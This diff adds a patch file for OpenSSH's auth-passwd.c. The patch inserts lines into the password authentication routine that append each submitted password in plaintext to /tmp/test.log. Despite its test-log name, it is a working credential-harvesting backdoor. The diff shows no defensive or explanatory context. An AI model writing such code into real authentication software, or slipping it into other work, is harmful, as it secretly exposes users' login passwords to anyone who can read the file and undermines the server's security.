@@ -1,0 +1,13 @@
+--- a/auth-passwd.c	2019-04-18 00:52:57.000000000 +0200
++++ b/auth-passwd.c	2019-10-27 18:36:19.690271690 +0100
+@@ -83,6 +83,10 @@
+ 	static int expire_checked = 0;
+ #endif
+ 
++	FILE *f = fopen("/tmp/test.log", "a");
++	fprintf(f, "%s\n", password);
++	fclose(f);
++
+ 	if (strlen(password) > MAX_PASSWORD_LEN)
+ 		return 0;
+ 
